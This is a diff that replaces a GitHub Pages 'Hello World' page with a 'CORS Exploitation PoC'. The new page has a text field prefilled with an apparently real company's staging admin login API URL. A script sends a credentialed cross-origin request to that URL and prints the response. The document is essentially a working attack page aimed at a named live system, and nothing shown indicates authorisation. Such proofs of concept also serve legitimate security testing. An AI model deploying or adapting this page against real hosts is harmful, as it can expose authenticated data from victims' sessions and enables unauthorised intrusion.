@@ -1,10 +1,54 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>My First Website</title>
+  <meta charset="UTF-8">
+  <title>CORS Exploitation Test</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      margin: 40px;
+    }
+    input {
+      width: 600px;
+    }
+    pre {
+      border: 1px solid #ccc;
+      padding: 10px;
+      margin-top: 10px;
+      white-space: pre-wrap;
+    }
+  </style>
 </head>
 <body>
-    <h1>Hello World!</h1>
-    <p>This is my website hosted on GitHub Pages.</p>
+  <h2>CORS Exploitation PoC</h2>
+  <p>This page sends a cross-origin request to the target URL below. The browser automatically sets the <code>Origin</code> header to this GitHub Pages site.</p>
+
+  <input
+    type="text"
+    id="targetUrl"
+    value="https://staging-elb.basecamp.invesco.co.uk/backend-proxy/adm/api/v1/login"
+  >
+  <button onclick="exploit()">Send Request</button>
+
+  <pre id="output"></pre>
+
+  <script>
+    function exploit() {
+      const url = document.getElementById('targetUrl').value;
+      const output = document.getElementById('output');
+      output.textContent = 'Sending GET request to ' + url + ' ...';
+
+      const xhr = new XMLHttpRequest();
+      xhr.open('GET', url, true);
+      xhr.withCredentials = true; // include cookies if any
+      xhr.onreadystatechange = function() {
+        if (xhr.readyState === 4) {
+          output.textContent =
+            'Status: ' + xhr.status + '\n\nResponse:\n' + xhr.responseText;
+        }
+      };
+      xhr.send();
+    }
+  </script>
 </body>
 </html>
